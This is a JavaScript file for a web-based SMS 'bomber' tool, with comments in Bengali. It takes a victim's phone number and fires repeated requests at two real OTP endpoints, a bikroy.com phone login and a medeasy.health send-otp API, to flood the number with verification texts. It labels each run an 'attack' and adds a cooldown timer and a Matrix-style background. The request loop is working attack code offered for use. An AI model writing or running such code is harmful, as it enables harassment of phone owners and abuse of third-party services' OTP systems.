let isCooldown = false; 

// পেজ লোড হওয়ার সময় আগের টাইমার চেক করবে
window.onload = function() {
    const savedCooldownTime = localStorage.getItem('cooldownEndTime');
    if (savedCooldownTime) {
        const currentTime = Date.now();
        if (currentTime < savedCooldownTime) {
            const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
            activateCooldown(remainingTime);
        }
    }
};

async function startProcess() {
    const target = document.getElementById('target').value;
    const countInput = document.getElementById('count');
    const count = parseInt(countInput.value);
    const display = document.getElementById('display');

    if (isCooldown) {
        display.innerText = "Wait for cooldown to end!";
        return;
    }

    if(!target || !count) { 
        display.innerText = "Enter number and amount!";
        return; 
    }

    if (count > 20) {
        display.innerText = "Error: Maximum limit is 20!";
        return;
    }

    display.innerText = "Attack Started...";
    
    // আপনার ফাইনাল ২ টি এপিআই লিস্ট
    const apiList = [
        `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`,
        `https://api.medeasy.health/api/send-otp/+88${target}/`
    ];

    for (let i = 1; i <= count; i++) {
        try { 
            // এই ২টি এপিআই থেকে পর্যায়ক্রমে এসএমএস যাবে
            let currentApi = apiList[(i - 1) % apiList.length];

            await fetch(currentApi, { 
                method: 'GET', 
                mode: 'no-cors',
                cache: 'no-store'
            }); 

            display.innerText = "Sent: " + i;
            
            // আপনার সেই নিরাপদ ৪ সেকেন্ডের বিরতি
            await new Promise(res => setTimeout(res, 4000));
        } catch (e) {
            console.log("Error skipped...");
        }
    }

    // কাজ শেষে ৬০ সেকেন্ডের কুলডাউন সেট করা
    const cooldownEndTime = Date.now() + 60000;
    localStorage.setItem('cooldownEndTime', cooldownEndTime);
    activateCooldown(60);
}

function activateCooldown(seconds) {
    isCooldown = true;
    let timeLeft = seconds;
    
    const timer = setInterval(() => {
        timeLeft--;
        document.getElementById('display').innerText = `Wait: ${timeLeft}s`;
        
        if (timeLeft <= 0) {
            clearInterval(timer);
            isCooldown = false;
            localStorage.removeItem('cooldownEndTime');
            document.getElementById('display').innerText = "Ready for Next Attack!";
        }
    }, 1000);
}

// Matrix Background Animation
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const letters = "0123456789ABCDEF";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ff00";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 33);
